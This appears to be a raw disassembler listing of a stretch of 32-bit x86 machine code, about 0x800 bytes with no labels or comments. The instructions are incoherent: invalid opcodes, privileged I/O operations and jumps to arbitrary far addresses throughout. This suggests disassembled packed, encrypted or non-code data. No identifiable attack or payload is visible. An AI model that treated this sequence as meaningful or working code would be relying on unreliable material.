  41887f:	sar    ecx,cl
  418881:	lods   al,BYTE PTR ds:[esi]
  418882:	sti    
  418883:	and    al,0x6f
  418885:	shl    ebp,cl
  418887:	jae    0x418895
  418889:	fisubr WORD PTR [ecx+0x2d0ae664]
  41888f:	(bad)  
  418890:	daa    
  418891:	out    0xc7,eax
  418893:	jecxz  0x41884f
  418895:	xchg   ebp,eax
  418896:	imul   edx,DWORD PTR [esi+0x22],0x1ff3fa23
  41889d:	cmp    eax,ebp
  41889f:	pop    esi
  4188a0:	mov    dl,0x8b
  4188a2:	sahf   
  4188a3:	push   es
  4188a4:	push   ecx
  4188a5:	aaa    
  4188a6:	xchg   ah,dh
  4188a8:	inc    edx
  4188a9:	lods   eax,DWORD PTR ds:[esi]
  4188aa:	pop    ss
  4188ab:	add    eax,DWORD PTR [ecx]
  4188ad:	daa    
  4188ae:	xchg   esp,eax
  4188af:	xor    BYTE PTR [edx],dl
  4188b1:	mov    ch,0xc8
  4188b3:	xchg   edi,eax
  4188b4:	rcl    edx,0x46
  4188b7:	push   ebx
  4188b8:	push   edi
  4188b9:	and    eax,edx
  4188bb:	mov    esp,0xe00bae8
  4188c0:	out    dx,al
  4188c1:	clc    
  4188c2:	cmp    bh,BYTE PTR [edx]
  4188c4:	mov    ch,0xac
  4188c6:	sub    al,0x24
  4188c8:	rcl    DWORD PTR [ecx-0x80],0xe2
  4188cc:	mov    esp,0xfc744146
  4188d1:	or     eax,ecx
  4188d3:	mov    BYTE PTR [edx+ecx*2],ch
  4188d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d7:	cmc    
  4188d8:	push   ds
  4188d9:	bound  ecx,QWORD PTR [ebx+0x1ecddbac]
  4188df:	mov    al,0x71
  4188e1:	sbb    BYTE PTR [ebx],bh
  4188e3:	fsubr  DWORD PTR [esi]
  4188e5:	jecxz  0x4188b1
  4188e7:	test   eax,ebx
  4188e9:	mov    DWORD PTR [edx],ebx
  4188eb:	repnz adc bh,bh
  4188ee:	lahf   
  4188ef:	push   edx
  4188f0:	xchg   esi,eax
  4188f1:	repnz rcr WORD PTR [eax+0x595c5965],cl
  4188f9:	pop    ds
  4188fa:	icebp  
  4188fb:	dec    eax
  4188fc:	xor    ch,ah
  4188fe:	test   BYTE PTR [edi+esi*1],ah
  418901:	popa   
  418902:	iret   
  418903:	ins    DWORD PTR es:[edi],dx
  418904:	mov    ds:0x4a430732,al
  418909:	xchg   edx,eax
  41890a:	dec    ebp
  41890b:	pop    edx
  41890c:	cmp    eax,0xa0b54927
  418911:	jne    0x4188ba
  418913:	mov    al,ds:0x7f7f2aed
  418918:	lods   al,BYTE PTR ds:[esi]
  418919:	mov    ecx,0x8ff13ff1
  41891e:	jo     0x4188b3
  418920:	lods   eax,DWORD PTR ds:[esi]
  418921:	je     0x418934
  418923:	mov    eax,ds:0xed1b398a
  418928:	fild   QWORD PTR [edx-0x3109e66d]
  41892e:	adc    esi,edi
  418930:	xchg   edi,eax
  418931:	lahf   
  418932:	add    bl,BYTE PTR [esi+0x6ab3966e]
  418938:	xor    ch,cl
  41893a:	sub    ebp,ebp
  41893c:	repz sti 
  41893e:	inc    ecx
  41893f:	and    ebx,DWORD PTR [esi+ebx*1-0x39]
  418943:	rcr    ah,1
  418945:	adc    BYTE PTR [esi-0x66e17ec9],cl
  41894b:	xlat   BYTE PTR ds:[ebx]
  41894c:	fs aad 0xd8
  41894f:	jecxz  0x418959
  418951:	ror    BYTE PTR [edx+0x11e0674c],0xc
  418958:	dec    esi
  418959:	xor    BYTE PTR [ebp-0x7017c836],dh
  41895f:	in     eax,0xc9
  418961:	rol    ecx,0x50
  418964:	pop    ss
  418965:	int    0x43
  418967:	popf   
  418968:	scas   eax,DWORD PTR es:[edi]
  418969:	es icebp 
  41896b:	cmc    
  41896c:	and    al,0x8b
  41896e:	push   ebx
  41896f:	mov    al,ds:0x499e44ba
  418974:	mov    ch,0xb8
  418976:	dec    esi
  418977:	sti    
  418978:	fcomip st,st(1)
  41897a:	test   al,0x29
  41897c:	mov    edx,0xf2a5a66b
  418981:	jg     0x4189ce
  418983:	rcl    BYTE PTR fs:[edx+eiz*2-0x487974fa],1
  41898b:	push   ds
  41898c:	popa   
  41898d:	xor    eax,0xe5168b0d
  418992:	retf   0xef14
  418995:	or     esi,ebp
  418997:	ficomp WORD PTR [ebx-0x55]
  41899a:	je     0x418980
  41899c:	out    0x8b,eax
  41899e:	lahf   
  41899f:	scas   al,BYTE PTR es:[edi]
  4189a0:	pop    ebp
  4189a1:	mov    bh,0x8b
  4189a3:	jmp    0x4189b2
  4189a5:	jl     0x4189e9
  4189a7:	ret    0x2b76
  4189aa:	in     al,0x9f
  4189ac:	push   ecx
  4189ad:	in     al,0xab
  4189af:	add    dl,BYTE PTR [esi-0x3e]
  4189b2:	inc    edi
  4189b3:	mov    ah,0x2b
  4189b5:	call   0xac49feb0
  4189ba:	xor    cl,BYTE PTR [ebx-0x26d1a725]
  4189c0:	sbb    DWORD PTR [esi+0x983c8cd],ebp
  4189c6:	pusha  
  4189c7:	(bad)  
  4189c8:	cmp    esp,DWORD PTR [edi+0x4d]
  4189cb:	and    al,0x67
  4189cd:	scas   al,BYTE PTR es:[edi]
  4189ce:	mov    cl,0x69
  4189d0:	xchg   esp,eax
  4189d1:	jmp    0x6a2f:0x896ec062
  4189d8:	and    eax,0xf2a6eed6
  4189dd:	fisttp QWORD PTR [ecx-0x2dd84ccd]
  4189e3:	mov    cl,0xe2
  4189e5:	adc    edx,0x28
  4189e8:	fdivr  st(7),st
  4189ea:	add    ebp,DWORD PTR [ebx+0x16]
  4189ed:	rcr    bh,0xc2
  4189f0:	jp     0x4189fc
  4189f2:	push   ebx
  4189f3:	stos   DWORD PTR es:[edi],eax
  4189f4:	push   cs
  4189f5:	mov    edi,0x9acedaa3
  4189fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189fb:	leave  
  4189fc:	mov    WORD PTR [esi-0x22260d00],?
  418a02:	arpl   di,sp
  418a04:	xlat   BYTE PTR ds:[ebx]
  418a05:	inc    BYTE PTR [ebx+0x1]
  418a08:	pop    ecx
  418a09:	mov    eax,ds:0x19024e8f
  418a0e:	jg     0x4189ab
  418a10:	pusha  
  418a11:	push   ebp
  418a12:	pop    edi
  418a13:	gs in  eax,0x87
  418a16:	shl    BYTE PTR [eax],1
  418a18:	inc    eax
  418a19:	mov    gs,ebp
  418a1b:	aaa    
  418a1c:	(bad)  
  418a1d:	mov    dl,0x7c
  418a1f:	outs   dx,DWORD PTR ds:[esi]
  418a20:	mov    WORD PTR [ebp-0x6b2777ab],ds
  418a26:	or     eax,0xde1d7c87
  418a2b:	mov    ds:0x2ffd311e,al
  418a30:	rol    DWORD PTR [edx+ecx*8-0x53bcd466],0x18
  418a38:	cmp    cl,BYTE PTR [ecx+0x4624eb32]
  418a3e:	clc    
  418a3f:	mov    esi,0xf2bc5727
  418a44:	js     0x418a9a
  418a46:	add    bl,bh
  418a48:	lods   eax,DWORD PTR ds:[esi]
  418a49:	dec    DWORD PTR [edx-0x2c7a40a8]
  418a4f:	or     edi,eax
  418a51:	call   0xb681271d
  418a56:	pop    eax
  418a57:	push   esi
  418a58:	push   es
  418a59:	fucomip st,st(1)
  418a5b:	clc    
  418a5c:	lds    ebx,FWORD PTR ds:0xc9dc287d
  418a62:	lahf   
  418a63:	cmp    BYTE PTR [edi],0x5e
  418a66:	mov    ebx,0x7feef4a8
  418a6b:	scas   eax,DWORD PTR es:[edi]
  418a6c:	das    
  418a6d:	out    dx,al
  418a6e:	loopne 0x418a07
  418a70:	rcl    DWORD PTR [ebx-0x3dcf539b],cl
  418a76:	mov    DWORD PTR [ebp-0x64],esi
  418a79:	push   cs
  418a7a:	push   edi
  418a7b:	jb     0x418ae1
  418a7d:	pop    es
  418a7e:	aad    0xb
  418a80:	mov    WORD PTR [edx+eax*2+0x438a077],cs
  418a87:	or     ebx,DWORD PTR [ebx+0x7c3da66e]
  418a8d:	int3   
  418a8e:	adc    BYTE PTR [esi+ecx*2-0x3c0b7f28],ch
  418a95:	(bad)  
  418a96:	jns    0x418a75
  418a98:	pop    ds
  418a99:	in     eax,0xed
  418a9b:	mov    BYTE PTR [ebx-0x4],ch
  418a9e:	int3   
  418a9f:	imul   esi,edx,0x73
  418aa2:	scas   al,BYTE PTR es:[edi]
  418aa3:	cmp    cl,ch
  418aa5:	lods   eax,DWORD PTR ds:[esi]
  418aa6:	inc    esi
  418aa7:	add    BYTE PTR [edx+0x26a7b7ad],cl
  418aad:	inc    ebp
  418aae:	in     eax,dx
  418aaf:	push   eax
  418ab0:	pusha  
  418ab1:	add    al,0xf0
  418ab3:	and    eax,0xd330a485
  418ab8:	fisttp DWORD PTR [eax+0x7]
  418abb:	gs push cs
  418abd:	je     0x418b04
  418abf:	cmp    al,BYTE PTR [edx+0x647cb112]
  418ac5:	test   DWORD PTR [eax-0x79],ebp
  418ac8:	je     0x418af8
  418aca:	sbb    DWORD PTR [esp+ebx*8],ebx
  418acd:	mov    ch,0x5f
  418acf:	add    al,0xda
  418ad1:	aad    0x88
  418ad3:	jecxz  0x418af2
  418ad5:	sub    eax,0x3315bbb3
  418ada:	enter  0x4c6a,0xc1
  418ade:	fwait
  418adf:	into   
  418ae0:	jbe    0x418b5f
  418ae2:	cmp    eax,DWORD PTR [ecx+0x57ef7244]
  418ae8:	cmp    edx,DWORD PTR [ecx-0x60]
  418aeb:	arpl   WORD PTR [edx-0x3beff06a],sp
  418af1:	in     eax,dx
  418af2:	jmp    0x1449:0xd53edc7c
  418af9:	xchg   esi,eax
  418afa:	jae    0x418b3d
  418afc:	xchg   ecx,eax
  418afd:	xchg   esi,eax
  418afe:	lods   eax,DWORD PTR ds:[esi]
  418aff:	mov    dh,0x8
  418b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b02:	mov    WORD PTR [ecx+0x47a25bb1],?
  418b08:	push   cs
  418b09:	pop    edx
  418b0a:	fistp  WORD PTR [eax]
  418b0c:	sbb    al,ch
  418b0e:	sbb    BYTE PTR [eax+ebx*1-0x2e7f6f6d],ah
  418b15:	jnp    0x418a9a
  418b17:	mov    ecx,0x72cee8fe
  418b1c:	mov    dl,0x5f
  418b1e:	inc    eax
  418b1f:	sbb    eax,0xa66d7703
  418b24:	aad    0x78
  418b26:	jmp    0x418b7c
  418b28:	pop    eax
  418b29:	mov    BYTE PTR [eax+ecx*1],ah
  418b2c:	mov    esi,0x6083f878
  418b31:	int    0xaf
  418b33:	cs adc eax,0xf6b7358b
  418b39:	mov    ds:0xef1aa663,al
  418b3e:	fst    QWORD PTR [ebx+0x30]
  418b41:	mov    ch,cl
  418b43:	cli    
  418b44:	test   al,0xaf
  418b46:	jae    0x418b23
  418b48:	pop    edi
  418b49:	jecxz  0x418b7a
  418b4b:	mov    edx,0x9c80edbd
  418b50:	cmc    
  418b51:	ss push ss
  418b53:	push   cs
  418b54:	xor    cl,bl
  418b56:	push   edx
  418b57:	js     0x418b4d
  418b59:	data16 xlat BYTE PTR ds:[ebx]
  418b5b:	push   ebx
  418b5c:	mov    es,WORD PTR ds:0x6b18075c
  418b62:	xchg   BYTE PTR [esi],ch
  418b64:	les    ebp,FWORD PTR [edx]
  418b66:	add    ch,BYTE PTR [edx]
  418b68:	loope  0x418afd
  418b6a:	xchg   ecx,eax
  418b6b:	fbstp  TBYTE PTR [eax-0x78]
  418b6e:	ret    
  418b6f:	mov    dl,0xcc
  418b71:	jmp    0x57ac38f2
  418b76:	(bad)  
  418b77:	mov    dl,0xa5
  418b79:	mov    ebp,0x667351cf
  418b7e:	loopne 0x418b90
  418b80:	push   eax
  418b81:	pop    edi
  418b82:	btc    DWORD PTR [edi-0x36],esi
  418b86:	push   0xbdba236c
  418b8b:	mov    DWORD PTR [edx+0x79e02a20],eax
  418b91:	inc    esp
  418b92:	(bad)  [ebp-0x4bca253e]
  418b98:	xor    BYTE PTR [edx+edx*4+0x6a],0x67
  418b9d:	inc    esp
  418b9e:	or     eax,0xe4caf02f
  418ba3:	ds inc edx
  418ba5:	ret    0x26d6
  418ba8:	push   esi
  418ba9:	repz xchg ebx,eax
  418bab:	push   eax
  418bac:	sbb    BYTE PTR [esi+eiz*1+0x4e0de9de],0x6
  418bb4:	sbb    BYTE PTR ds:0xcef04065,cl
  418bba:	mov    bh,0x13
  418bbc:	adc    DWORD PTR [ecx],edi
  418bbe:	xchg   edi,eax
  418bbf:	fadd   QWORD PTR [edx]
  418bc1:	loopne 0x418bd4
  418bc3:	inc    esp
  418bc4:	jo     0x418bfc
  418bc6:	mov    ebp,0xe80e74d2
  418bcb:	inc    eax
  418bcc:	mul    DWORD PTR [ecx+0x480ec667]
  418bd2:	out    0xd7,eax
  418bd4:	imul   edi,DWORD PTR [edi-0x1adbb24c],0xa30bb77c
  418bde:	cwde   
  418bdf:	dec    eax
  418be0:	and    eax,0x8e92cabc
  418be5:	mov    bh,0xa6
  418be7:	rol    eax,1
  418be9:	mov    dl,0xc8
  418beb:	mov    eax,ds:0x5afc829
  418bf0:	and    eax,0xc315390b
  418bf5:	or     BYTE PTR [ebx+0x510c93de],bl
  418bfb:	ds push cs
  418bfd:	out    0xdc,eax
  418bff:	dec    ebx
  418c00:	mov    bl,0x7e
  418c02:	rol    BYTE PTR [edx],cl
  418c04:	jnp    0x418c09
  418c06:	inc    ebp
  418c07:	add    al,0xd8
  418c09:	push   eax
  418c0a:	xchg   ebp,eax
  418c0b:	stos   DWORD PTR es:[edi],eax
  418c0c:	ret    
  418c0d:	jge    0x418c0d
  418c0f:	out    dx,eax
  418c10:	jnp    0x418bac
  418c12:	inc    esp
  418c13:	jg     0x418bfc
  418c15:	fwait
  418c16:	int3   
  418c17:	inc    edi
  418c18:	imul   esi,DWORD PTR [eax+0x4a32c695],0x92db5b3d
  418c22:	mov    ecx,0x6cc8699d
  418c27:	push   esp
  418c28:	stos   BYTE PTR es:[edi],al
  418c29:	jbe    0x418c51
  418c2b:	adc    DWORD PTR [ebp+0x51],ebp
  418c2e:	in     eax,0x33
  418c30:	adc    BYTE PTR [eax+0x52],cl
  418c33:	call   0x72a15a16
  418c38:	(bad)
  418c3b:	mov    edx,0xce892d58
  418c40:	(bad)  
  418c41:	ss push edx
  418c43:	lea    edx,[esi-0xf]
  418c46:	cmp    bh,BYTE PTR [esi+0x3f]
  418c49:	push   cs
  418c4a:	pop    es
  418c4b:	pop    edx
  418c4c:	daa    
  418c4d:	ja     0x418c6e
  418c4f:	add    BYTE PTR [esp+eiz*8+0xf1b2807],dh
  418c56:	fwait
  418c57:	sub    eax,0xc2a541f3
  418c5c:	mov    ebp,0x98c28d00
  418c61:	in     eax,0xbf
  418c63:	into   
  418c64:	adc    edx,edi
  418c66:	std    
  418c67:	and    al,BYTE PTR [esi+0x65]
  418c6a:	mov    bl,0x3d
  418c6c:	scas   eax,DWORD PTR es:[edi]
  418c6d:	sbb    DWORD PTR [ebx-0x1a37eb0d],esp
  418c73:	push   es
  418c74:	jae    0x418cdf
  418c76:	jmp    0xec9d:0xa9a9188c
  418c7d:	xor    eax,0x72cc645a
  418c82:	fild   QWORD PTR [ebx]
  418c84:	data16 cmp al,0xd8
  418c87:	aad    0x3d
  418c89:	lods   eax,DWORD PTR ds:[esi]
  418c8a:	push   eax
  418c8b:	arpl   WORD PTR [ebp+0x4f49ff98],si
  418c91:	xor    ebx,edx
  418c93:	(bad)  
  418c94:	push   esp
  418c95:	xchg   esp,eax
  418c96:	rol    BYTE PTR [edx-0x49],cl
  418c99:	inc    edi
  418c9a:	jo     0x418cb2
  418c9c:	adc    DWORD PTR [eax-0x66c07ec3],0x1d8eb8e
  418ca6:	hlt    
  418ca7:	push   eax
  418ca8:	pop    ecx
  418ca9:	aaa    
  418caa:	sbb    esp,edi
  418cac:	fiadd  DWORD PTR [edi]
  418cae:	in     eax,dx
  418caf:	mov    ecx,0x8a44f18
  418cb4:	pushf  
  418cb5:	enter  0x188a,0x9a
  418cb9:	fadd   st(0),st
  418cbb:	pop    edi
  418cbc:	or     al,BYTE PTR [edi-0x64da5d4a]
  418cc2:	mov    cs,WORD PTR [edx-0x3afe3834]
  418cc8:	mov    edx,0x81240c3f
  418ccd:	cwd    
  418ccf:	xor    ecx,esp
  418cd1:	inc    ebp
  418cd2:	fsubp  st(7),st
  418cd4:	push   ss
  418cd5:	mov    ah,0xff
  418cd7:	inc    edi
  418cd8:	daa    
  418cd9:	mov    dl,0x8d
  418cdb:	aaa    
  418cdc:	sbb    BYTE PTR [ebx+0xd],bh
  418cdf:	dec    ecx
  418ce0:	add    ebp,DWORD PTR [ecx]
  418ce2:	mov    eax,0x1647ee92
  418ce7:	adc    al,0x5e
  418ce9:	clc    
  418cea:	sti    
  418ceb:	div    BYTE PTR [edx-0xc]
  418cee:	pop    es
  418cef:	pop    esp
  418cf0:	into   
  418cf1:	cdq    
  418cf2:	mov    WORD PTR [ecx],gs
  418cf4:	rcl    DWORD PTR [eax],1
  418cf6:	ds (bad) 
  418cf8:	pop    ds
  418cf9:	mov    ecx,DWORD PTR [eax]
  418cfb:	cli    
  418cfc:	xchg   ebx,eax
  418cfd:	sbb    DWORD PTR [ecx-0x78],0xbe8bc417
  418d04:	shl    DWORD PTR [ebx-0x63],1
  418d07:	pop    DWORD PTR [edx+0x7f8b6a10]
  418d0d:	adc    eax,0x2aec6632
  418d12:	out    dx,eax
  418d13:	(bad)  
  418d14:	lock jge 0x418ce6
  418d17:	jmp    0x257:0x8cddea57
  418d1e:	adc    eax,DWORD PTR [ecx-0x1fcd337e]
  418d24:	adc    al,0x2e
  418d26:	js     0x418d3e
  418d28:	cmp    eax,0xc1689507
  418d2d:	mov    ebp,0x6abdbe98
  418d32:	mov    ch,0xbd
  418d34:	(bad)  
  418d35:	lods   eax,DWORD PTR ds:[esi]
  418d36:	jbe    0x418cf5
  418d38:	lods   eax,DWORD PTR ds:[esi]
  418d39:	adc    ah,dl
  418d3b:	jno    0x418d35
  418d3d:	xor    eax,0x5bdb24ac
  418d42:	mov    eax,0x7ef69f48
  418d47:	dec    edx
  418d48:	(bad)  
  418d4a:	fidiv  WORD PTR [ebp+0x3590e3e2]
  418d50:	xchg   ebx,eax
  418d51:	or     eax,DWORD PTR [edx+0x64226c9e]
  418d57:	push   edi
  418d58:	xchg   edi,eax
  418d59:	jge    0x418dd7
  418d5b:	sbb    ebp,DWORD PTR [esi]
  418d5d:	invlpg BYTE PTR [ebp-0x1d73f631]
  418d64:	mov    esp,0xa7882fab
  418d69:	mov    dl,0xe2
  418d6b:	xor    DWORD PTR [ebx],eax
  418d6d:	lahf   
  418d6e:	test   DWORD PTR [ebp+edi*8+0x4b48bff8],eax
  418d75:	adc    bh,BYTE PTR [ecx]
  418d77:	adc    ebx,DWORD PTR [ecx-0x15]
  418d7a:	mov    al,0xc1
  418d7c:	mov    ebx,0x8c158e68
  418d81:	or     esi,DWORD PTR ds:[edi-0x15]
  418d85:	or     DWORD PTR [esi],edx
  418d87:	leave  
  418d88:	ret    0x429b
  418d8b:	test   dh,0x86
  418d8e:	shr    BYTE PTR [ebx+eax*2],cl
  418d91:	sbb    edx,DWORD PTR [ebx]
  418d93:	adc    eax,0x33136bf9
  418d98:	or     DWORD PTR [edi-0x23d29737],ecx
  418d9e:	sub    eax,DWORD PTR [ebp+0x7d]
  418da1:	push   ebp
  418da2:	fs pop edx
  418da4:	or     eax,0x1deebb89
  418da9:	outs   dx,BYTE PTR ds:[esi]
  418daa:	stos   DWORD PTR es:[edi],eax
  418dab:	lahf   
  418dac:	cmp    al,0xb8
  418dae:	add    BYTE PTR [ebx+0x12],cl
  418db1:	push   edi
  418db2:	aam    0x6f
  418db4:	and    edi,DWORD PTR [eax-0x43a66f0c]
  418dba:	or     edi,DWORD PTR ds:0xe674388b
  418dc0:	clc    
  418dc1:	cmc    
  418dc2:	into   
  418dc3:	xchg   edx,eax
  418dc4:	adc    edx,edx
  418dc6:	mov    al,ds:0x21af5905
  418dcb:	out    dx,al
  418dcc:	cmp    esp,DWORD PTR [ecx]
  418dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dcf:	xchg   ecx,eax
  418dd0:	mov    edx,0x682e674d
  418dd5:	mov    WORD PTR [edi+0x41],?
  418dd8:	iret   
  418dd9:	or     al,0x5c
  418ddb:	lods   al,BYTE PTR ds:[esi]
  418ddc:	xchg   esi,eax
  418ddd:	(bad)  
  418dde:	popa   
  418ddf:	jle    0x418d67
  418de1:	call   0x76a4e8e6
  418de6:	xor    dh,BYTE PTR [esi+0x3b]
  418de9:	mov    ch,0xe9
  418deb:	fimul  DWORD PTR [esi-0x38]
  418dee:	shr    BYTE PTR [ebx+0xab0b4cc],cl
  418df4:	mov    bl,0xf5
  418df6:	ja     0x418e02
  418df8:	cmp    eax,0xe399e93b
  418dfd:	cld    
  418dfe:	(bad)  
  418dff:	imul   DWORD PTR [esi]
  418e01:	fwait
  418e02:	retf   0xf19c
  418e05:	aas    
  418e06:	and    dl,bl
  418e08:	add    eax,DWORD PTR ds:0x60640fb1
  418e0e:	push   ds
  418e0f:	in     al,0x24
  418e11:	mov    esp,DWORD PTR [eax-0x24]
  418e14:	imul   edx,ebx,0xdc46fb6e
  418e1a:	or     BYTE PTR [ecx],bh
  418e1c:	inc    esp
  418e1d:	xchg   ebp,eax
  418e1e:	mov    BYTE PTR [edi],bl
  418e20:	js     0x418e4f
  418e22:	cmp    edx,DWORD PTR [ecx+ebx*1]
  418e25:	out    0x32,al
  418e27:	in     ax,0x74
  418e2a:	(bad)  
  418e2b:	not    bl
  418e2d:	es push ebx
  418e2f:	repz mov ebp,0x58215513
  418e35:	test   DWORD PTR [edi],ebx
  418e37:	cmp    DWORD PTR [edx],esp
  418e39:	fist   WORD PTR [eax-0x57d3081d]
  418e3f:	cmp    ch,bh
  418e41:	mov    ?,WORD PTR [esi-0x49]
  418e44:	shl    DWORD PTR [eax+0x6c],cl
  418e47:	sbb    BYTE PTR [edx-0x4e],ah
  418e4a:	mov    BYTE PTR [ebx],ah
  418e4c:	pop    ebp
  418e4d:	push   es
  418e4e:	push   0x39a42f87
  418e53:	inc    ecx
  418e54:	xor    DWORD PTR [edx],0xffffffd4
  418e57:	jecxz  0x418e72
  418e59:	add    eax,0x1c5ac86f
  418e5e:	jmp    0xa228:0x74216b2f
  418e65:	inc    esi
  418e66:	and    edx,0xfffffff0
  418e69:	mov    al,0xea
  418e6b:	test   BYTE PTR [ecx-0x7c],dl
  418e6e:	add    al,ch
  418e70:	inc    ebx
  418e71:	loope  0x418e5a
  418e73:	inc    edx
  418e74:	mov    dh,al
  418e76:	rcl    BYTE PTR [ebp+0xa],1
  418e79:	popf   
  418e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e7b:	cli    
  418e7c:	shr    DWORD PTR [ecx],cl
  418e7e:	mov    edx,0x73d03931
  418e83:	xor    DWORD PTR [edx],eax
  418e85:	fadd   DWORD PTR [edx+0x55]
  418e88:	jmp    0x9e2ab682
  418e8d:	daa    
  418e8e:	enter  0x874,0x2d
  418e92:	mov    BYTE PTR [ecx-0x55a466cf],cl
  418e98:	jge    0x418eed
  418e9a:	stos   DWORD PTR es:[edi],eax
  418e9b:	lods   al,BYTE PTR ds:[esi]
  418e9c:	gs inc esi
  418e9e:	jg     0x418ef6
  418ea0:	sub    dh,BYTE PTR [eax-0x65e325c3]
  418ea6:	jo     0x418ef8
  418ea8:	cmp    BYTE PTR [esi-0x2b],ah
  418eab:	sub    eax,0x1e36a4e4
  418eb0:	out    dx,al
  418eb1:	pop    eax
  418eb2:	out    dx,al
  418eb3:	adc    eax,0x808919ef
  418eb8:	jno    0x418e3c
  418eba:	mov    edi,0xfcdaf090
  418ebf:	push   eax
  418ec0:	sub    BYTE PTR [ecx-0x579c4179],0xf7
  418ec7:	stos   DWORD PTR es:[edi],eax
  418ec8:	xchg   BYTE PTR [edx-0x3ac4f0c0],dl
  418ece:	sub    al,0x50
  418ed0:	ret    0x8d7b
  418ed3:	fcom   st(6)
  418ed5:	clc    
  418ed6:	mov    bh,0xf8
  418ed8:	or     al,0xff
  418eda:	push   0x8da497bb
  418edf:	mov    ch,0x3c
  418ee1:	cmp    BYTE PTR ss:[eax+edx*4],dh
  418ee5:	jnp    0x418e78
  418ee7:	sbb    eax,DWORD PTR [edi]
  418ee9:	ja     0x418ea0
  418eeb:	sub    ebp,ebx
  418eed:	xchg   esi,edx
  418eef:	push   ecx
  418ef0:	xlat   BYTE PTR ds:[ebx]
  418ef1:	jmp    0xa95ec922
  418ef6:	mov    ebx,0x2f083850
  418efb:	out    dx,eax
  418efc:	adc    eax,0xe86d1eb7
  418f01:	pushf  
  418f02:	sar    edx,0xc2
  418f05:	jmp    0x418f22
  418f07:	lds    esp,FWORD PTR [ebx-0x5d]
  418f0a:	je     0x418efa
  418f0c:	xor    al,BYTE PTR [eax+edx*4-0x482b0b68]
  418f13:	pop    esi
  418f14:	mov    ch,0xf7
  418f16:	in     eax,0xf8
  418f18:	popf   
  418f19:	gs sti 
  418f1b:	mov    esp,DWORD PTR [eax+0x2b]
  418f1e:	popa   
  418f1f:	aas    
  418f20:	push   es
  418f21:	ret    0xf70a
  418f24:	enter  0x168,0x3c
  418f28:	clc    
  418f29:	mov    al,ds:0x18e3877b
  418f2e:	mov    al,ds:0xb3dc1597
  418f33:	push   edx
  418f34:	(bad)  
  418f35:	jg     0x418f28
  418f37:	pop    esp
  418f38:	dec    edi
  418f39:	push   es
  418f3a:	lds    ebp,FWORD PTR [esp+ecx*4]
  418f3d:	xchg   DWORD PTR [ecx+0x6b65cd3e],ecx
  418f43:	popa   
  418f44:	add    DWORD PTR [ecx+esi*2],edx
  418f47:	and    BYTE PTR [ebx+edi*4],0xe
  418f4b:	dec    ebp
  418f4c:	lods   eax,DWORD PTR ds:[esi]
  418f4d:	push   ds
  418f4e:	xor    eax,0x7614fcde
  418f53:	sbb    DWORD PTR [ebp+0x7e3379d9],ecx
  418f59:	xchg   edx,eax
  418f5a:	mov    cl,0xb1
  418f5c:	icebp  
  418f5d:	ror    DWORD PTR [ecx+0x29],0xb2
  418f61:	sub    al,0xd9
  418f63:	xor    DWORD PTR [eax+0x4b],edi
  418f66:	xor    esp,DWORD PTR ds:0xd0f467f
  418f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6d:	fdivr  DWORD PTR [eax]
  418f6f:	sub    BYTE PTR [esi+esi*8],dh
  418f72:	dec    eax
  418f73:	mov    cl,0xfa
  418f75:	je     0x418fa1
  418f77:	mov    edx,0xebf5eb3e
  418f7c:	jno    0x418faa
  418f7e:	mov    dl,0xc2
  418f80:	cmp    bh,bh
  418f82:	addr16 addr16 clts 
  418f86:	mov    edx,ebp
  418f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f89:	call   0x810:0xc9a5d3c
  418f90:	aaa    
  418f91:	add    dh,al
  418f93:	test   ebp,esp
  418f95:	out    0x3d,eax
  418f97:	dec    ebp
  418f98:	sub    bl,dl
  418f9a:	dec    esp
  418f9b:	(bad)  
  418f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f9d:	add    eax,0xf7d2fc98
  418fa2:	fs xor eax,0xe35646fd
  418fa8:	dec    ebp
  418fa9:	rol    cl,0xd4
  418fac:	add    eax,0xc91a0c9c
  418fb1:	fadd   QWORD PTR [ebx]
  418fb3:	jbe    0x418fb7
  418fb5:	xchg   DWORD PTR [eax],edi
  418fb7:	mov    al,0x38
  418fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fba:	jbe    0x418faa
  418fbc:	push   edi
  418fbd:	das    
  418fbe:	arpl   WORD PTR [edi+0x22],dx
  418fc1:	ins    BYTE PTR es:[edi],dx
  418fc2:	pop    ebx
  418fc3:	xchg   al,al
  418fc5:	pop    ecx
  418fc6:	stos   BYTE PTR es:[edi],al
  418fc7:	scas   al,BYTE PTR es:[edi]
  418fc8:	inc    esi
  418fc9:	iret   
  418fca:	aam    0x47
  418fcc:	adc    al,0x51
  418fce:	pop    es
  418fcf:	push   0xe9d44882
  418fd4:	dec    edi
  418fd5:	pusha  
  418fd6:	call   0xa829e02d
  418fdb:	dec    eax
  418fdc:	adc    al,0x24
  418fde:	adc    bl,dh
  418fe0:	aaa    
  418fe1:	rcl    BYTE PTR [edx-0x4fbf6887],0x7f
  418fe8:	add    ebp,edi
  418fea:	and    eax,0x7ff05fed
  418fef:	jmp    0x7ea3:0x21dea44a
  418ff6:	fdivr  QWORD PTR [edi+0x33]
  418ff9:	fneni(8087 only) 
  418ffb:	and    DWORD PTR [eax+ebx*2-0x7e],ecx
  418fff:	fldenv [ebp+0x1e]
  419002:	aad    0x18
  419004:	xchg   esp,eax
  419005:	lahf   
  419006:	fistp  WORD PTR [ebx]
  419008:	mov    ah,BYTE PTR [esi-0x25]
  41900b:	xor    ecx,DWORD PTR [edi-0xc]
  41900e:	inc    BYTE PTR [ecx]
  419010:	jbe    0x418fb8
  419012:	jecxz  0x419083
  419014:	push   es
  419015:	pop    ebp
  419016:	xchg   ebx,eax
  419017:	sbb    BYTE PTR [edi],cl
  419019:	push   esi
  41901a:	push   ss
  41901b:	add    BYTE PTR [ebx+0x13],0xb6
  41901f:	push   cs
  419020:	lds    edi,FWORD PTR [edx+0x3923886f]
  419026:	xchg   edx,eax
  419027:	jb     0x418fd5
  419029:	mov    bh,0xd6
  41902b:	ja     0x419098
  41902d:	dec    edi
  41902e:	adc    esi,DWORD PTR [edx]
  419030:	(bad)  
  419031:	fdivr  DWORD PTR [edi-0x19e22c7]
  419037:	sar    BYTE PTR [ebx],0x2e
  41903a:	icebp  
